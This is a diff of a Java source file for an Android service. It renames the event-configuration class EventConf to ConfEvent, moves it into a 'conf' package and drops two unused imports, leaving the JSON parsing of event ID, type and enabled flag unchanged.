@@ -5,20 +5,18 @@
  * Created   : 01-dec-2010
  **********************************************/
 
-package com.android.service.event;
+package com.android.service.conf;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import com.android.service.action.Action;
-import com.android.service.agent.AgentConf;
-import com.android.service.conf.JSONConf;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class Event.
  */
-public class EventConf extends JSONConf {
+public class ConfEvent extends JSONConf {
 
 	/** Event unique ID. */
 	private final int eventId;
@@ -33,7 +31,7 @@ public class EventConf extends JSONConf {
 
 	public boolean enabled;
 
-	public EventConf(int eventId, String eventType, JSONObject params) throws JSONException {
+	public ConfEvent(int eventId, String eventType, JSONObject params) throws JSONException {
 		super(eventType, params);
 
 		this.eventId = eventId;
@@ -59,7 +57,7 @@ public class EventConf extends JSONConf {
 		enabled = params.getBoolean("enabled");
 	}
 
-	public EventConf(int id, JSONObject conf) throws JSONException {
+	public ConfEvent(int id, JSONObject conf) throws JSONException {
 		this(id, conf.getString("event"), conf);
 	}
 
